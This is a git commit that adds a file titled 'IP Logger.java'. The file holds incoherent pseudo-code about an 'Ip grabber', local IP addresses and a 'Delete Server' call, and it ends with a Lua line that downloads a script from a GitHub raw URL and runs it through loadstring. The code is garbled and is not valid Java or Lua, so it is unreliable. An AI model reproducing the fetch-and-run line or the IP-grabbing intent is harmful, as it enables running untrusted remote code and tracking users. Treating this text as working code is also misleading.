68a78d1b542e59acc3b2c7bc9cd09e0a130e086e
90PuroXx <126303785+RikoTheDemonHunter@users.noreply.github.com>
2025-01-07 09:49:19 +0800

    IP Logger.java

---
+++ IP Logger.java
@@ -0,0 +1,24 @@
+local file {}
+
+function auto logger, = True')
+
+  Ip grabber Dns Port = 192.168.73.63 
+
+  Local port ("Name:D Link 5G")
+   Local = Protocol ('10.10.10.0")
+
+Function = Localfile ("Delete Server")
+
+                         end
+
+                     end  
+                  end
+               end 
+            end)
+
+1LocalFile = loadstring(game:HttpGet("https://raw.githubusercontent.com/RikoTheDemonHunter/V3/refs/heads/main/Auto%20Equip.lua"))()
+  
+  
+
+  
+
